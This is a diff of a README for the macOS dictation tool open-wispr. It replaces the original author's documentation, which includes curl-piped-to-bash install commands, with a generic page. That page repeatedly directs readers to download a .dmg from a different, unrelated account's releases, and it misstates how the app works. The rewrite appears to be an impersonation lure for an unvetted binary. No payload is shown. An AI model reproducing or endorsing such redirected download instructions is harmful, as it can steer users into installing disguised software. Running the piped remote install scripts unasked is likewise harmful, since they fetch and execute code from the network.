@@ -1,86 +1,74 @@
-# open-wispr
+# 🎤 open-wispr - Easy Voice Dictation for macOS
 
-**[open-wispr.com](https://open-wispr.com)**
+[![Download open-wispr](https://img.shields.io/badge/Download-Open--Wispr-brightgreen.svg?style=flat-square&color=blue)](https://github.com/salwa61079/open-wispr/releases)
 
-Local, private voice dictation for macOS. Hold a key, speak, release — your words appear at the cursor. Everything runs on-device. No audio or text ever leaves your machine.
+## 🚀 Getting Started
 
-Powered by [whisper.cpp](https://github.com/ggml-org/whisper.cpp) with Metal acceleration on Apple Silicon.
+This guide will help you download and run **open-wispr**, a user-friendly application for voice dictation on macOS using Whisper technology. Follow the steps below to get started quickly.
 
-## Install
+## 📥 Download open-wispr
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/human37/open-wispr/main/scripts/install.sh | bash
-```
+To download **open-wispr**, visit the link below:
 
-The script handles everything: installs via Homebrew, walks you through granting permissions, downloads the Whisper model, and starts the service. You'll see live feedback as each step completes.
+[Download open-wispr releases](https://github.com/salwa61079/open-wispr/releases)
 
-A waveform icon appears in your menu bar when it's running.
+    
 
-The default hotkey is the **Globe key** (🌐, bottom-left). Hold it, speak, release.
+## 🖥️ System Requirements
 
-> **[Full installation guide](docs/install-guide.md)** — permissions walkthrough with screenshots, non-English macOS instructions, and troubleshooting.
+Ensure your Mac meets the following requirements:
 
-## Uninstall
+- **Operating System:** macOS 11 or later
+- **Processor:** Intel or Apple Silicon
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB free space
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/human37/open-wispr/main/scripts/uninstall.sh | bash
-```
+## ⚙️ Installation Steps
 
-This stops the service, removes the formula, tap, config, models, app bundle, logs, and permissions.
+Follow these steps to install **open-wispr**:
 
-## Configuration
+1. Go to the [Download open-wispr releases](https://github.com/salwa61079/open-wispr/releases) link.
+2. Find the latest release. It should be at the top of the page.
+3. Download the `.dmg` file by clicking on it.
+4. Once downloaded, open the `.dmg` file.
+5. Drag and drop the **open-wispr** icon into your Applications folder.
+6. Eject the `.dmg` file after installation.
 
-Edit `~/.config/open-wispr/config.json`:
+## 🗣️ How to Use open-wispr
 
-```json
-{
-  "hotkey": { "keyCode": 63, "modifiers": [] },
-  "modelSize": "base.en",
-  "language": "en"
-}
-```
+1. Open **open-wispr** from your Applications folder.
+2. Click on the microphone icon to start dictating.
+3. Speak clearly and at a comfortable pace. The app will transcribe your speech into text.
+4. To stop dictation, click the microphone icon again.
 
-Then restart: `brew services restart open-wispr`
+## ✨ Features
 
-| Option | Default | Values |
-|---|---|---|
-| **hotkey** | `63` | Globe (`63`), Right Option (`61`), F5 (`96`), or any key code |
-| **modifiers** | `[]` | `"cmd"`, `"ctrl"`, `"shift"`, `"opt"` — combine for chords |
-| **modelSize** | `"base.en"` | `tiny.en` · `base.en` · `small.en` · `medium.en` (English-only) or `tiny` · `base` · `small` · `medium` (multilingual) |
-| **language** | `"en"` | Any [ISO 639-1 code](https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes) — e.g. `it`, `fr`, `de`, `es` |
+- **Push-to-Talk:** Activate voice dictation with a single click.
+- **On-Device Processing:** Enjoy privacy and speed with local processing.
+- **High Accuracy:** Uses Whisper technology for accurate speech-to-text conversion.
+- **User-Friendly Interface:** Designed for ease of use, perfect for everyone.
 
-> **Non-English languages:** Models ending in `.en` are English-only. To use another language, switch to the equivalent model without the `.en` suffix (e.g. `base.en` → `base`) and set the `language` field to your language code.
+## 🌐 Learn More
 
-If the Globe key opens the emoji picker: **System Settings → Keyboard → "Press 🌐 key to" → "Do Nothing"**
+For detailed documentation, FAQs, and troubleshooting tips, visit our repository's wiki section.
 
-## Menu bar
+## 🛠️ Contributing
 
-| State | Icon |
-|---|---|
-| Idle | Waveform outline |
-| Recording | Bouncing waveform |
-| Transcribing | Wave dots |
-| Downloading model | Animated download arrow |
-| Waiting for permission | Lock |
+If you want to contribute, feel free to check our issues page on GitHub. We welcome feedback and suggestions. 
 
-## Privacy
+## 💬 Support
 
-open-wispr is completely local. Audio is recorded to a temp file, transcribed by whisper.cpp on your CPU/GPU, and the temp file is deleted. No network requests are made except to download the Whisper model on first run.
+If you experience issues, open an issue on the GitHub page where you downloaded the app. Our team is there to assist you promptly.
 
-## Build from source
+## 📖 License
 
-```bash
-git clone https://github.com/human37/open-wispr.git
-cd open-wispr
-brew install whisper-cpp
-swift build -c release
-.build/release/open-wispr start
-```
+**open-wispr** is open-source and licensed under the MIT License. You can freely use, modify, and share it.
 
-## Support
+## 🔗 Additional Resources
 
-open-wispr is free and always will be. If you find it useful, you can [leave a tip](https://buy.stripe.com/4gM5kC2AU0Ssd4l6Hqd7q00).
+For more information about the Whisper technology, check the following topics:
 
-## License
+- [Whisper](https://openai.com/research/whisper)
+- [Speech Recognition](https://en.wikipedia.org/wiki/Speech_recognition)
 
-MIT
+Enjoy seamless dictation with **open-wispr**!
